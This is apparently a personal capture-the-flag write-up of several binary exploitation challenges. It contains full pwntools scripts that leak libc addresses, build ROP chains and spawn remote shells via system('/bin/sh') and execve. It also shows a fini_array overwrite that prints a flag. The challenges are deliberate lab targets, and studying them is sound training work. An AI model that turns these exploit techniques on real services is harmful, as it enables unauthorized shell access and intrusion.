# PWN

# controller

```python
#!/usr/bin/python3

from pwn import *

context.binary = './controller'
elf = ELF("./controller")
#p = elf.process()
p = remote("188.166.145.178",31635)

def exploit():

    #binaries

    offset = 40
    ret = 0x400606
    pop_rdi = 0x4011d3
    main = 0x401124
    calculator_addr = 0x401066
    puts = 0x400630

    # stage I

    payload = b"A"*offset
    payload += p64(pop_rdi)
    payload += p64(elf.got["puts"])
    payload += p64(puts)
    payload += p64(elf.symbols['main'])

    p.sendline("-130676 -2")
    p.sendlineafter("> ","4")
    p.sendlineafter("> ",payload)

    p.recvline(b"Problem ingored\n")

    leak = u64(p.recv()[:6].ljust(8,b"\x00"))
    print(f"Leaked libc : {hex(leak)}")

    # stage II

    libc = ELF("./libc.so.6")

    libc.address = leak - libc.symbols["puts"] 
    print(f"Libc BASE : {hex(libc.address)}")

    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]
    print('binsh is ' + hex(bin_sh))
    print('system is ' + hex(system))

    payload = b"A"*offset
    payload += pack(pop_rdi)
    payload += pack(bin_sh)
    payload += pack(ret)
    payload += pack(system)
    payload += pack(0xdeadbeefdeadbabe)

    p.sendline("-130676 -2")
    p.sendlineafter("> ","4")
    p.sendlineafter("> ",payload)

    p.interactive()

if __name__=="__main__":
    exploit()
```

# System dROP

Using Ghidra
```c
undefined8 main(void)

{
  undefined local_28 [32];
  
  alarm(0xf);	
  read(0,local_28,0x100);
  return 1;
}
```
It looks like we have a pretty generous BOF.
The only mitigation is a non-exec stack.
```bash
ubuntu@ubuntu:~/Desktop/cyber_apocalypse$ checksec --file=./system_drop
[*] '/home/ubuntu/Desktop/cyber_apocalypse/system_drop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
But we find no useful functions to leak libc, we only have read() and alarm()

To search for example for a pointer to a pointer
```bash
gef > search-pattern 0x400560
```

```python
#!/usr/bin/python3

from pwn import *

elf = ELF("./system_drop")

IP = '139.59.174.238'
port = 31089
context.binary = './system_drop'
#context.log_level = 'debug'
# it is a 64 bit, little endian

debug = 0
offset = 40
padding = b'A'*offset

pop_rdi = pack(0x4005d3)
pop_rsi_r15 = pack(0x4005d1)
pop_r15 = pack(0x4005d2)

syscall = 0x40053b
syscall_func = 0x400537
#syscall = 0x400537 # the function not just the call

read = pack(elf.plt["read"])
alarm = pack(elf.plt["alarm"])

pop_rbp = pack(0x4004b8)
ret = pack(0x400416)

pop_rbx_rbp_r12_r13_r14_r15 = pack(0x4005ca)

mov_rdx_r15_mov_rsi_r14_mov_edi_r13d_call_r12_plus_4rbx = pack(0x4005b0)
# weird gadget which is not really a gadget

main_address = pack(0x400541)
troll = pack(0xdeadbeefdeadbabe)
ptr_to_init = 0x400e38
# bss = 0x601038
bss = 0x601028
def build_payload():
    #the challange is populating the rdx register, we will do this using ret to csu
    payload = [padding,
                pop_rbx_rbp_r12_r13_r14_r15, pack(0x0), pack(0x1), pack(ptr_to_init), # affect next instruction to be executed -> rbx=0, rbp=1, r12=ptr_to_init
                pack(0), pack(bss), pack(0x8),  # r13d goes into edi, bss -> where to write, 0x8 -> how much to read
                mov_rdx_r15_mov_rsi_r14_mov_edi_r13d_call_r12_plus_4rbx,
                troll, troll, troll, troll, troll, troll, troll,
                # it isn't a rop gadget so we have to play with the exectuion a little
                pop_rdi, pack(0x0), pack(elf.symbols['read']), main_address
                # read from stdin (0), call read, then call main to exploit again
    ]
    payload = b''.join(payload)
    return payload

def build_payload2():
    payload = [padding,
                pop_rbx_rbp_r12_r13_r14_r15, pack(0x0), pack(0x1), pack(ptr_to_init), # affect next instruction to be executed -> rbx=0, rbp=1, r12=ptr_to_init
                pack(0x0), pack(bss+8), pack(bss+8),  # r13d goes into edi, bss -> where to write, 0xf -> how much to read
                mov_rdx_r15_mov_rsi_r14_mov_edi_r13d_call_r12_plus_4rbx,
                troll, troll, troll, troll, troll, troll, troll
    ]
    payload = b''.join(payload)

    #payload += pop_rdi
    #payload += pack(0x0) # works with or without these 2 instructions
    #                           because rdi will become 0 from the above instructions
    payload += alarm
    # cancel current alarm
    payload += pop_rdi
    payload += pack(0x3b) # execve syscall
    payload += alarm
    payload += pop_rdi
    payload += pack(0x0)
    payload += alarm
    # this puts 0x3b into rax by returning it from alarm
    
    payload += pop_rdi
    payload += pack(bss)
    payload += pack(syscall_func)

    return payload

def main():
    if debug == 0:
        payload = build_payload()
        payload2 = build_payload2()
        print(f'The length of the first payload is {len(payload)}')
        print(f'The length of the second payload is {len(payload2)}')

        p = remote(IP, port)
        #p = elf.process()

        #gdb.attach(p)
        
        payload += int((256 - len(payload))/8)*ret
        payload2 += int((256 - len(payload2))/8)*ret

        print(f'The length of the first payload is {len(payload)}')
        print(f'The length of the second payload is {len(payload2)}')
        
        p.send(payload)

        p.send(b"/bin/sh\x00")

        p.sendline(payload2)
        p.interactive()

if __name__=="__main__":
    main()
```

# Minefield

```bash
ubuntu@ubuntu:~/Desktop/cyber_apocalypse/challenge$ checksec --file ./minefield 
[*] '/home/ubuntu/Desktop/cyber_apocalypse/challenge/minefield'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Thi
```c
void mission(undefined8 uParm1,void *pvParm2,undefined8 uParm3,char *pcParm4,int iParm5,int iParm6)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  int extraout_EDX;
  int extraout_EDX_00;
  void *pvVar3;
  long in_FS_OFFSET;
  char local_24 [10];
  char local_1a [10];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Insert type of mine: ");
  r(local_24,pvParm2,extraout_EDX,pcParm4,iParm5,iParm6);
  pvVar3 = (void *)0x0;
  puVar1 = (ulonglong *)strtoull(local_24,(char **)0x0,0);
  printf("Insert location to plant: ");
  r(local_1a,pvVar3,extraout_EDX_00,pcParm4,iParm5,iParm6);
  puts("We need to get out of here as soon as possible. Run!");
  uVar2 = strtoull(local_1a,(char **)0x0,0);
  *puVar1 = uVar2;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
After 'Insert type of mine', we can read at most 9 chars, same goes for the location.

```c
unsigned long long int strtoull (const char* str, char** endptr, int base);
```
Converts the string from str, into base base

endptr is a `char *`, whose value is set by the function to the next character in str after the numerical value.

base -> If this is 0, the base used is determined by the format in the sequence

Sothing from documentation -> An optional prefix indicating octal or hexadecimal base ("0" or "0x"/"0X" respectively)
So it recognizes hex.

The value at the first address we input becomes the second value we input, and this is the only exploit.

We see that system is imported.

We have an arbitrary write.

At this address `0x400ce8` we have the string `cat flag*`

There is actually this weird function that, if called, prints the flag.

Since RelRo is disabled, we can overwrite the fini_array with the address of the 'win' function
```c
void _(void)

{
  long lVar1;
  size_t __n;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  __n = strlen("\nMission accomplished! ✔\n");
  write(1,&DAT_00400ccc,__n);
  system("cat flag*");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

```bash
ubuntu@ubuntu:~/Desktop/cyber_apocalypse/challenge$ nc 139.59.174.238 30630
Are you ready to plant the mine?
1. No.
2. Yes, I am ready.
> 2
We are ready to proceed then!
Insert type of mine: 0x601078
Insert location to plant: 0x40096b
We need to get out of here as soon as possible. Run!

Mission accomplished! ✔
CHTB{d3struct0r5_m1n3f13ld}
```

# Harvest

In inventory we can input negative pies.

piecheck -> pies have to be < 0x65 and != 0xf

```bash
ubuntu@ubuntu:~/Desktop/cyber_apocalypse/challenge$ checksec --file ./harvester 
[*] '/home/ubuntu/Desktop/cyber_apocalypse/challenge/harvester'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
It couldn't have had more protections.

```bash
ubuntu@ubuntu:~/Desktop/cyber_apocalypse/challenge$ ./harvester 

A wild Harvester appeared 🐦

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 2

You have: 10 🥧

Do you want to drop some? (y/n)
> y

How many do you want to drop?
> -11

You have: 21 🥧

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 3

You try to find its weakness, but it seems invincible..
Looking around, you see something inside a bush.
[+] You found 1 🥧!

You also notice that if the Harvester eats too many pies, it falls asleep.
Do you want to feed it?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

This did not work as planned..
*** stack smashing detected ***: terminated
Aborted (core dumped)
```
Found the bof...20 minutes left...no time...good night guys

